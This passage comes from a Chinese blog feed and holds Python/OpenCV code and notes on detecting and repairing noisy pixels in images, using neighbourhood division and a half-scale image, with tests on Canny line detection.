class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel.col):</span><br><span class="line">            <span class="keyword">if</span> half_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                <span class="comment"># pixel_channel.channel[i*2][j*2] = 0</span></span><br><span class="line">                <span class="comment"># 若检测出为噪声，则将原图中的点的噪声值增加（至少大于阈值）</span></span><br><span class="line">                pixel_channel.noise[i*<span class="number">2</span>][j*<span class="number">2</span>] += <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    half_b = half(b)</span><br><span class="line">    half_g = half(g)</span><br><span class="line">    half_r = half(r)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.noise.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.noise[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.pixel.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.channel[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="二、随机噪声值"><a href="#二、随机噪声值" class="headerlink" title="二、随机噪声值"></a>二、随机噪声值</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>真实情况下，噪声不一定是白色，那么尝试人为给定随机值的噪声</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img = cv.imread(<span class="string">&quot;img.png&quot;</span>, <span class="number">1</span>)</span><br><span class="line">(rows, cols, chn) = img.shape</span><br><span class="line">cv.imshow(<span class="string">&quot;img.png&quot;</span>, img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加噪声</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    x = np.random.randint(<span class="number">0</span>, rows)</span><br><span class="line">    y = np.random.randint(<span class="number">0</span>, cols)</span><br><span class="line">    img[x, y, :] = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cv.imshow(<span class="string">&quot;noise&quot;</span>, img)</span><br><span class="line">cv.imwrite(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">cv.waitKey()</span><br><span class="line">cv.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="噪声效果"><a href="#噪声效果" class="headerlink" title="噪声效果"></a>噪声效果</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011549595.png" alt="4"></p><h3 id="噪声修复"><a href="#噪声修复" class="headerlink" title="噪声修复"></a>噪声修复</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011549306.png" alt="5"></p><p>肉眼观察，大约有五个点没有被修复</p><p>调整阈值，发现效果也没有多大改善</p><h2 id="三、降噪对直线检测的影响"><a href="#三、降噪对直线检测的影响" class="headerlink" title="三、降噪对直线检测的影响"></a>三、降噪对直线检测的影响</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>这里主要测试噪声对直线检测的影响</p><p>直线检测用Canny算子完成</p><h3 id="降噪前"><a href="#降噪前" class="headerlink" title="降噪前"></a>降噪前</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011549303.png" alt="6"></p><h3 id="降噪后"><a href="#降噪后" class="headerlink" title="降噪后"></a>降噪后</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011549153.png" alt="7"></p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>能看到红框标记的地方有明显的优化</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011549538.png" alt="8"></p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210425</title>
      <link href="/20210425-img-report/"/>
      <url>/20210425-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="图片素材"><a href="#图片素材" class="headerlink" title="图片素材"></a>图片素材</h2><p>根据上周的打上噪声的图片，继续制造更恶劣的噪声环境——有多个噪声点连在一起（如下图红框内部分所示）</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011543640.png" alt="1"></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011544714.png" alt="2"></p><p>从中可以看出，两个噪声点连在一起时，还是有可能被检测出来，但连起来的噪声点数量变多之后，就会产生，检测不完全或者无法检测出来的结果</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>拟用缩小二分之一的方法进行检测</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.将图片缩小二分之一：</span></span><br><span class="line"><span class="string">    取左上角的点</span></span><br><span class="line"><span class="string">2.找出噪声点：</span></span><br><span class="line"><span class="string">    划分方法一</span></span><br><span class="line"><span class="string">    划分方法二</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">3.修改</span></span><br><span class="line"><span class="string">    找最接近的未标记过的点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图像缩小到一半</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    min_index = 0</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &lt; p[min_index]:</span></span><br><span class="line"><span class="string">            min_index = i</span></span><br><span class="line"><span class="string">    max_index1 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &gt; p[max_index1]:</span></span><br><span class="line"><span class="string">            max_index1 = i</span></span><br><span class="line"><span class="string">    max_index2 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and p[i] &gt; p[max_index2]:</span></span><br><span class="line"><span class="string">            max_index2 = i</span></span><br><span class="line"><span class="string">    max_index3 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and p[i] &gt; p[max_index3]:</span></span><br><span class="line"><span class="string">            max_index3 = i</span></span><br><span class="line"><span class="string">    max_index4 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and i != max_index3 and p[i] &gt; p[max_index4]:</span></span><br><span class="line"><span class="string">            max_index4 = i</span></span><br><span class="line"><span class="string">    # 将较小的的四个标记为1区域，较大区域标记为2</span></span><br><span class="line"><span class="string">    result[max_index1] = 2</span></span><br><span class="line"><span class="string">    result[max_index2] = 2</span></span><br><span class="line"><span class="string">    result[max_index3] = 2</span></span><br><span class="line"><span class="string">    result[max_index4] = 2</span></span><br><span class="line"><span class="string">    for i in range(8):</span></span><br><span class="line"><span class="string">        if result[i] != 2:</span></span><br><span class="line"><span class="string">            result[i] = 1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">if</span> max1 - min2 &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊值处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_check</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span 